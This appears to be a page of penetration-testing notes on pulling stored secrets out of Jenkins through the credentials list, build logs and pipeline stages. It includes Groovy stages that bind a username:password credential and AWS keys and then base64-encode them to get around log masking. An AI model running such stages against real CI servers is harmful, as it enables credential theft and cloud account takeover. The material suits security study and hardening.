# Credentials Dumping

## Credentials in Text fields in Credentials List
- We can find the list of credentials name and id at http://host:ip/credentials/
- While this sounds very hypothetical, it is very much real to find credentials in text and name section.
- Possible reason for rewriting credentials in credentials description makes it easier to remember purpose, or for making debugging easy.

## Dumping credentials from logs

- Build logs are generated from the build output.
- In certain cases depending on how the pipeline is created, credentials can get logged in the build output
<img src="buildlog-password1.png">

## Credentials Dumping from pipeline

- We can store various kinds of credentials in Jenkins ( username:password, AWS credential, secret file, secret text, Github credentials, certificate )
- The withCredentials() function can pass the credential id for the required secret and that credential will be available as an environment variable.
- If there are some global credentials or credentials for the current project scope we can dump them. 
- It is important to know the name of the parameter, and if you have guessed correctly we can get the parameter id from here ( http://host:ip/credentials/ )
- Credentials Bindings ( https://www.jenkins.io/doc/pipeline/steps/credentials-binding/ )

- Dumping Username:Password
``` Groovy
stage('Credential Dumping') {
            steps {
                 withCredentials(
                    [usernameColonPassword(credentialsId: '3b258e73-5e16-4338-883e-7a24927aefe1', variable: 'USERPASS')]
                ) {
                    sh '''
                        echo "$USERPASS" | base64
                    '''
                }
            }
        }
```
- Dumping AWS Keys ( References : https://stackoverflow.com/questions/53859575/jenkinsfile-access-aws-credentials )
```
        stage('Credential Dumping') {
            steps {
                 withCredentials([[$class: 'AmazonWebServicesCredentialsBinding',credentialsId: "8ada641e-429c-4547-9921-a1581dbf86ef",accessKeyVariable: 'AWS_ACCESS_KEY_ID',secretKeyVariable: 'AWS_SECRET_ACCESS_KEY'
]]) {
                    sh '''
                        echo "$AWS_ACCESS_KEY_ID" | base64
                    '''
                }
            }
        }
```        

## Credentials Dumping from Script Console

## References
- https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials
